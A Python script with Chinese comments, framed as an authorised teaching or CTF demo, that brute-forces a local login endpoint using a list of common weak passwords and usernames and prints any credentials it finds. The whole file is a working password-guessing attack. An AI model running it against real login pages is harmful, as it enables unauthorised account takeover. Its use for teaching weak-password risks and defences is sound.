#!/usr/bin/env python3
"""
安全测试脚本：登录接口暴力破解演示
====================================
WARNING: 此脚本仅用于经授权的安全测试、CTF 竞赛或教学演示。
严禁在未获得目标系统所有者书面许可的情况下对任何系统进行测试。

说明：
- 本脚本用于演示针对弱口令的在线爆破过程。
- 如果目标系统已启用 CSRF 防护、速率限制或账户锁定，
  本脚本通常无法直接成功，这正说明安全防护措施生效。
"""

import time
import requests

target_url = "http://127.0.0.1:5000/login"

# 密码字典（常见弱密码）
passwords = [
    "admin", "admin123", "admin123456", "password", "123456",
    "12345678", "123456789", "qwerty", "abc123", "letmein",
    "welcome", "monkey", "dragon", "master", "sunshine",
    "princess", "football", "iloveyou", "trustno1", "passw0rd",
    "alice2025", "alice", "root", "test", "guest",
    "administrator", "admin2023", "admin2024", "admin2025",
    "a123456", "Aa123456", "111111", "000000", "pass",
]

usernames = ["admin", "alice", "root", "test"]
delay_between_attempts = 1.0  # 请求间隔，降低对目标服务的压力
found = False


def try_login(sess, username, password):
    """
    尝试登录。

    注意：
    - 若目标启用 CSRF 防护，简单脚本通常无法通过校验。
    - 若目标启用速率限制，过快请求会被拦截。
    """
    data = {"username": username, "password": password}
    r = sess.post(target_url, data=data, allow_redirects=True)
    return r.status_code == 200 and "欢迎" in r.text


with requests.Session() as sess:
    for username in usernames:
        print(f"[*] 正在尝试用户: {username}")
        for pwd in passwords:
            print(f"[-] 尝试 {username}:{pwd}")
            try:
                if try_login(sess, username, pwd):
                    print(f"[+] 破解成功！用户名: {username}  密码: {pwd}")
                    found = True
                    break
            except requests.RequestException as e:
                print(f"[!] 请求异常: {e}")

            time.sleep(delay_between_attempts)

        if found:
            break

if not found:
    print("[-] 爆破结束，未找到有效凭证。目标可能已启用安全防护措施。")
